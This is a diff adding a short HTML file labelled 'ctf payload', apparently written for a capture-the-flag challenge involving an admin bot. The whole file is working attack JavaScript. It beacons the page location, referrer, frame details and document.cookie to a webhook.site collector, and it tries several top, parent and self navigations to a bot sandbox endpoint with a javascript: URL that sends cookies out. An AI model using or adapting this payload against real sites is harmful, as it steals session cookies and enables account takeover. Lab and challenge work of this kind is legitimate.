@@ -1,0 +1,29 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>ctf payload</title>
+<script>
+const UUID = "2531dabf-eb9f-480d-8460-e07d24bb6bb9";
+const TS = "1783182889956";
+function enc(x){try{return encodeURIComponent(String(x)).slice(0,1600)}catch(e){return 'encerr'}}
+function log(stage, data){
+  try{ (new Image()).src='https://webhook.site/'+UUID+'?stage='+encodeURIComponent(stage)+'&ts='+TS+'&d='+enc(data)+'&r='+Math.random(); }catch(e){}
+}
+window.onerror = function(m,s,l,c,e){ log('onerror', m+' @'+l+':'+c+' '+(e&&e.name)); };
+log('gh-start', 'href='+location.href+' ref='+document.referrer+' top='+(top===window)+' parent='+(parent===window)+' cookie='+document.cookie);
+setTimeout(()=>{
+  try{ log('frameElement', window.frameElement ? ('tag='+window.frameElement.tagName+' sandbox='+window.frameElement.getAttribute('sandbox')) : 'null'); }
+  catch(e){ log('frameElement-err', e.name+':'+e.message); }
+}, 200);
+setTimeout(()=>{
+  try{ top.location.href='http://nginx/bot/sandbox?target='+encodeURIComponent('javascript:fetch('https://webhook.site/'+UUID+'?stage=top-js-'+TS+'&c='+encodeURIComponent(document.cookie),{mode:'no-cors'})'); log('topnav-set','ok'); }
+  catch(e){ log('topnav-err', e.name+':'+e.message); }
+}, 700);
+setTimeout(()=>{
+  try{ parent.location.href='http://nginx/bot/sandbox?target='+encodeURIComponent('//webhook.site/'+UUID+'?stage=parent-inner-'+TS); log('parentnav-set','ok'); }
+  catch(e){ log('parentnav-err', e.name+':'+e.message); }
+}, 1300);
+setTimeout(()=>{
+  try{ location.href='http://nginx/bot/sandbox?target='+encodeURIComponent('//webhook.site/'+UUID+'?stage=self-inner-'+TS); log('selfnav-set','ok'); }
+  catch(e){ log('selfnav-err', e.name+':'+e.message); }
+}, 2200);
+</script>
